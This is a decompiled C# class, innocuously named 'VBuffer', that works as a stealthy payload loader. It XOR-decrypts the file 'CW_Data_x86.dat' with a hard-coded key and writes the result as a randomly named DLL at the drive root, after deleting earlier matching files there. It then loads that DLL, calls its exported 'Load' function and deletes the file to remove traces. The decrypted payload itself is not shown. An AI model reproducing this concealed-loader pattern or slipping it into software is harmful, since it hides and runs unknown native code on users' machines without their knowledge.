using System;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;

namespace VBuffer
{
	// Token: 0x020003A4 RID: 932
	internal class VBuffer
	{
		// Token: 0x06001DCB RID: 7627
		[DllImport("kernel32.dll")]
		public static extern IntPtr LoadLibrary(string dllToLoad);

		// Token: 0x06001DCC RID: 7628
		[DllImport("kernel32.dll")]
		public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);

		// Token: 0x06001DCD RID: 7629
		[DllImport("kernel32.dll")]
		public static extern bool FreeLibrary(IntPtr hModule);

		// Token: 0x06001DCE RID: 7630 RVA: 0x00104A5C File Offset: 0x00102C5C
		public static string RandomString(int iLength)
		{
			return new string((from s in Enumerable.Repeat<string>("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", iLength)
			select s[VBuffer.BufferRandom.Next(s.Length)]).ToArray<char>());
		}

		// Token: 0x06001DCF RID: 7631 RVA: 0x00104AA0 File Offset: 0x00102CA0
		public void Init(string Argument1)
		{
			byte[] array = File.ReadAllBytes("CW_Data_x86.dat");
			byte[] array2 = new byte[]
			{
				174,
				211,
				200,
				144
			};
			for (int i = 0; i < array.Length; i++)
			{
				array[i] ^= array2[i % array2.Length];
			}
			string pathRoot = Path.GetPathRoot(Directory.GetCurrentDirectory());
			foreach (string path in Directory.GetFiles(pathRoot, "*HO_*"))
			{
				File.Delete(path);
			}
			string text = pathRoot + "\\HO_" + VBuffer.RandomString(8) + ".dll";
			using (FileStream fileStream = new FileStream(text, FileMode.Create, FileAccess.Write))
			{
				fileStream.Write(array, 0, array.Length);
				fileStream.Close();
			}
			IntPtr intPtr = VBuffer.LoadLibrary(text);
			if (intPtr != IntPtr.Zero)
			{
				IntPtr procAddress = VBuffer.GetProcAddress(intPtr, "Load");
				if (procAddress != IntPtr.Zero)
				{
					VBuffer.Load load = (VBuffer.Load)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(VBuffer.Load));
					load(Argument1);
				}
				VBuffer.FreeLibrary(intPtr);
			}
			File.Delete(text);
		}

		// Token: 0x04002252 RID: 8786
		private static Random BufferRandom = new Random();

		// Token: 0x020003B3 RID: 947
		// (Invoke) Token: 0x06001E34 RID: 7732
		[UnmanagedFunctionPointer(CallingConvention.Winapi)]
		private delegate byte Load([MarshalAs(UnmanagedType.LPWStr)] string Argument1);
	}
}
